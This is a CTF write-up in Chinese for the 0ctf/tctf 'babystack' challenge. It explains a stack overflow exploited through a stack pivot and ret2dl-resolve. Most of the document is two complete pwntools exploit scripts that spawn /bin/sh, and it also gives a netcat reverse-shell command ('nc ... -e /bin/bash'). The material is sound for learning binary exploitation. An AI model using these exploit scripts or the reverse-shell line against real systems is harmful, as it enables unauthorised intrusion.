### 0ctf/tctf babystack

+ [_dl_runtime_resolve源码](https://code.woboq.org/userspace/glibc/sysdeps/i386/dl-trampoline.S.html)
+ [Return-to-dl-resolve(相当好的一篇理解性文章)](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/)
+ [babystack手工](https://www.anquanke.com/post/id/103736)
+ [babystack远程](http://blog.plusls.cn/ctf/0ctf-2018/pwn/babystack/)
+ [babystack用roputils库](https://www.jianshu.com/p/1ade01da9b6b)
+ [ROP之return to dl-resolve](http://rk700.github.io/2015/08/09/return-to-dl-resolve/)

只有一个函数，明显就是一个栈溢出

<img src="/images/posts/0ctf/babystack/1525447243561.png" >

思路，因为溢出的字节不多，而且没有任何泄露函数，所以考虑先进行栈迁移，然后用ret2dlsolve技巧来getshell
可以先到这个[非常详细的学习地址](http://pwn4.fun/2016/11/09/Return-to-dl-resolve/)学习然后就可以进行相应的构造


脚本1(不用roputils库)：
**注：这个仅是本地getshell**
```
# -*- coding:utf-8 -*-
from pwn import *
#context.log_level = 'debug'
p = process('./babystack')
elf = ELF('./babystack')

read_plt = elf.plt['read']
alarm_plt = elf.plt['alarm']
pop_ebp_ret = 0x080484eb
ppp_ret = 0x080484e9
pp_ebp_ret = 0x080484ea
leave_ret = 0x08048455
stack_size = 0x800
bss_addr = 0x0804a020   #readelf -S babystack | grep ".bss"
base_stage = bss_addr + stack_size
plt_0 = 0x80482f0 # objdump -d -j .plt babystack
rel_plt = 0x80482b0 # objdump -s -j .rel.plt babystack
index_offset = (base_stage + 28) - rel_plt
alarm_got = elf.got['alarm']
print "alarm_got: ",hex(alarm_got)
print "alarm_plt: ",hex(alarm_plt)
print "read_plt: ",hex(read_plt)
dynsym = 0x080481CC
dynstr = 0x0804822C
fake_sym_addr = base_stage + 36
align = 0x10 - ((fake_sym_addr - dynsym) & 0xf)
fake_sym_addr = fake_sym_addr + align
index_dynsym = (fake_sym_addr - dynsym) / 0x10
r_info = index_dynsym << 8 | 0x7
fake_reloc = p32(alarm_got) + p32(r_info)
st_name = fake_sym_addr + 0x10 - dynstr
fake_sym = p32(st_name) + p32(0) + p32(0) + p32(0x12)



payload = 'a'*0x28 + p32(bss_addr)
payload += p32(read_plt) + p32(leave_ret) + p32(0) + p32(bss_addr) +     p32(36) 
raw_input("go:")
p.send(payload)

#fake stack 1 bss_addr
payload1 = 'aaaa' #pop ebp
payload1 += p32(read_plt) + p32(ppp_ret) + p32(0) + p32(base_stage) + p32(100)
payload1 += p32(pop_ebp_ret) + p32(base_stage) #fake stack again
payload1 += p32(leave_ret) #leave: mov esp,ebp; pop ebp
p.send(payload1)


cmd = "/bin/sh"
#fake stack 2 base_stage
payload2 = 'bbbb'
payload2 += p32(plt_0)
payload2 += p32(index_offset)
payload2 += 'aaaa'
payload2 += p32(base_stage + 80)
payload2 += 'aaaa'
payload2 += 'aaaa'
payload2 += fake_reloc #base_stage+28
payload2 += 'b' * align
payload2 += fake_sym #base_stage+36
payload2 += "system\x00"
payload2 += 'a' * (80 - len(payload2))
payload2 += cmd +'\x00'
payload2 += 'a' * (100 - len(payload2))
print len(payload2)
p.sendline(payload2)
p.interactive()
```

```
nc 127.0.0.1 7788 -e /bin/bash
nc -l 7788
```

### 用roputils库的脚本



```
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import roputils
#from hashlib import sha256

#p = process('./babystack')
p = remote('127.0.0.1',7788)
elf = ELF('./babystack')
'''
p = remote('202.120.7.202',6666)

random = p.recv(16)
print "[*]random"+random
flag=0
print random
for i in range(36,126):
        if flag==1:
                break
        for j in range(36,126):
                if flag==1:
                        break
                for k in range(36,126):
                        if flag==1:
                                break
                        for n in range(36,126):
                                str=chr(i)+chr(j)+chr(k)+chr(n)
                                if sha256(random+str).digest().startswith('\0\0\0'):
                                        hash=str
                                        print hash
                                        flag=1
                                        break

p.send(hash)
'''
payload = "A"*40
payload += p32(0x804a500)
payload += p32(0x8048446)
payload += p32(80)                 # exact length of stage 2 payload
payload += "B"*(64-len(payload))

rop = roputils.ROP('./babystack')
addr_bss = rop.section('.bss')
payload += "A"*40
payload += p32(0x804a500)

# Read the fake tabs from payload2 to bss
payload += rop.call("read", 0, addr_bss, 150)

# Call dl_resolve with offset to our fake symbol
payload += rop.dl_resolve_call(addr_bss+60, addr_bss)

# Create fake rel and sym on bss
payload2 = rop.string("/bin/sh")
payload2 += rop.fill(60, payload2)                        # Align symbol to bss+60
payload2 += rop.dl_resolve_data(addr_bss+60, "system")    # Fake r_info / st_name
payload2 += rop.fill(150, payload2)

payload += payload2
payload = payload.ljust(0x100, "\x00")
print len(payload)
p.sendline(payload)
#p.send("A"*44 + flat(rop) + "A"*(256-44-len(flat(rop))))
p.interactive()
```

